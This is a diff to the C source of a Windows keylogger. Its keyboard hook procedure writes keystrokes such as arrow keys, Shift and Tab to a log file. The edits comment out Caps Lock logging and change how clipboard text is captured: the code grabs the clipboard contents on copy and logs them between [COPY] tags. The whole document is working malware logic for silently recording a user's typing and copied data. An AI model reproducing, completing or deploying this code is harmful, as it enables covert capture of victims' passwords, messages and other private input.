@@ -50,7 +50,7 @@ LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam)
         switch(pkey->vkCode)
         {
             case VK_UP:
-                sprintf_s(inputLog, sizeof(inputLog), "[UP_ARROW]");
+            sprintf_s(inputLog, sizeof(inputLog), "[UP_ARROW]");
                 WriteToFile(inputLog);
                 break ;
             case VK_DOWN:
@@ -85,10 +85,10 @@ LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam)
                 sprintf_s(inputLog, sizeof(inputLog), "[LSHIFT]");
                 WriteToFile(inputLog);
                 break ;  
-            case VK_CAPITAL:
-                sprintf_s(inputLog, sizeof(inputLog), "[CAPSLOCK]");
-                WriteToFile(inputLog);
-                break ;
+            //case VK_CAPITAL:
+            //    sprintf_s(inputLog, sizeof(inputLog), "[CAPSLOCK]");
+            //    WriteToFile(inputLog);
+            //    break ;
             case VK_TAB:
                 sprintf_s(inputLog, sizeof(inputLog), "[TAB]");
                 WriteToFile(inputLog);
@@ -139,10 +139,11 @@ LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam)
                     if (!OpenClipboard(NULL))
                         return 1;
                     // SetClipboardData(CF_TEXT, NULL);
-                    HANDLE clipB = GetClipboardData(CF_TEXT | CF_UNICODETEXT);
+                    HANDLE clipB = GetClipboardData(CF_TEXT);
                     if (!clipB)
                         CloseClipboard();
-                    sprintf_s(inputLog, sizeof(inputLog), "[COPY]%s[/COPY]", (char*)GlobalLock(clipB));
+                    char *test = (char*)GlobalLock(clipB);
+                    sprintf_s(inputLog, sizeof(inputLog), "[COPY]%s[/COPY]", test);
                     WriteToFile(inputLog);
                     GlobalUnlock(clipB);
                     CloseClipboard();
